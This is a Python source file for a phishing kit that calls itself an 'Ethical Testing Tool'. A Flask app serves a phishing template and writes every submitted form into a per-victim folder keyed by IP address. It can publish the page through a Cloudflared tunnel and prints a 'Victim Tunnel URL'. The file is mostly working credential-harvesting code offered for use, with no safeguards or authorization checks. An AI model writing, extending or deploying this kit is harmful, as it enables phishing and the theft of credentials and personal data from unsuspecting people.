import os
import json
import subprocess
import platform
import shutil
import time
from flask import Flask, request, render_template
from typing import Optional

CONFIG_FILE = "config.json"
TEMPLATE_FOLDER = "templates"
DATA_FOLDER = "victim_data"

# Initialize Flask app
app = Flask(__name__, template_folder=TEMPLATE_FOLDER)

# Display a professional tool banner
def display_banner():
    print("\033[1;92m")
    print("██╗  ██╗ █████╗ ████████╗██████╗  ██████╗ ██╗   ██╗")
    print("██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║")
    print("███████║███████║   ██║   ██████╔╝██║   ██║██║   ██║")
    print("██╔══██║██╔══██║   ██║   ██   ██╗██║   ██║██║   ██║")
    print("██║  ██║██║  ██║   ██║   ██████╔╝╚██████╔╝╚██████╔╝")
    print("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═██║═╝ ")
    print("\033[1;94m")
    print("                H A T B OY")
    print("         Ethical Testing Tool v3.0")
    print("\033[1;93m")
    print("       Developed by Mister-God")
    print("\033[0m")

# Load or initialize the configuration file
def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    else:
        return {"localxpose_token": "", "port": "8080", "attacker_port": "9090"}

# Save configuration to file
def save_config(config: dict):
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Check and install dependencies
def check_dependencies():
    print("[*] Checking dependencies...")
    required_tools = ["php", "curl"]
    for tool in required_tools:
        if not shutil.which(tool):
            print(f"[!] Missing dependency: {tool}. Please install it and try again.")
            exit(1)
    print("[*] All dependencies are installed.")

# Install Cloudflared
def install_cloudflared():
    print("[*] Installing Cloudflared...")
    if not os.path.exists(".server"):
        os.makedirs(".server")
    arch = platform.machine()
    if arch == "x86_64":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    elif "arm" in arch:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    else:
        print("[!] Unsupported architecture.")
        return
    cloudflared_path = ".server/cloudflared"
    retries = 3
    for attempt in range(retries):
        try:
            subprocess.run(["curl", "-s", "-L", "-o", cloudflared_path, url], check=True)
            os.chmod(cloudflared_path, 0o755)
            if os.path.exists(cloudflared_path):
                print("[*] Cloudflared installed successfully.")
                return
        except subprocess.CalledProcessError as e:
            print(f"[!] Attempt {attempt + 1}/{retries} failed: {e}")
            if attempt < retries - 1:
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
            else:
                print("[!] Cloudflared installation failed after multiple attempts.")
                exit(1)

# Start a Cloudflared tunnel
def start_cloudflared(port: str) -> Optional[str]:
    cloudflared_path = ".server/cloudflared"
    if not os.path.exists(cloudflared_path):
        print("[!] Cloudflared binary is missing. Attempting to reinstall...")
        install_cloudflared()
    try:
        print("[*] Starting Cloudflared...")
        process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        for line in process.stdout:
            print(f"[Cloudflared Log] {line.strip()}")
            if "trycloudflare.com" in line:
                return line.split(" ")[-1].strip()
    except Exception as e:
        print(f"[!] Error starting Cloudflared: {e}")
    return None

# Flask route for phishing template
@app.route("/", methods=["GET", "POST"])
def phishing_page():
    victim_ip = request.remote_addr
    victim_folder = os.path.join(DATA_FOLDER, victim_ip)
    os.makedirs(victim_folder, exist_ok=True)

    if request.method == "POST":
        data = request.form
        with open(os.path.join(victim_folder, "details.json"), "w") as file:
            json.dump(data, file, indent=4)
        return render_template("thank_you.html")

    return render_template("phish.html")

# Flask route for logs
@app.route("/logs", methods=["GET"])
def logs_page():
    victim_ip = request.remote_addr
    victim_folder = os.path.join(DATA_FOLDER, victim_ip)
    os.makedirs(victim_folder, exist_ok=True)

    log_path = os.path.join(victim_folder, "logs.txt")
    with open(log_path, "a") as log_file:
        log_file.write(f"Accessed logs by IP: {victim_ip}\n")

    return render_template("logs.html")

# Main menu
def main_menu():
    config = load_config()
    port = config.get("port", "8080")
    print("[*] Select an option:")
    print("[1] Localhost")
    print("[2] Cloudflared")
    print("[3] LocalXpose")
    choice = input("Enter your choice: ").strip()
    if choice == "1":
        app.run(host="127.0.0.1", port=port)
        print(f"[+] Victim URL: http://127.0.0.1:{port}")
    elif choice == "2":
        print("[*] Starting Cloudflared...")
        tunnel_url = start_cloudflared(port)
        if tunnel_url:
            print(f"[+] Victim Tunnel URL: {tunnel_url}")
        else:
            print("[!] Unable to create Cloudflared tunnel.")
    else:
        print("[!] Invalid choice. Exiting.")

if __name__ == "__main__":
    display_banner()
    if not os.path.exists(DATA_FOLDER):
        os.makedirs(DATA_FOLDER)
    check_dependencies()
    main_menu()
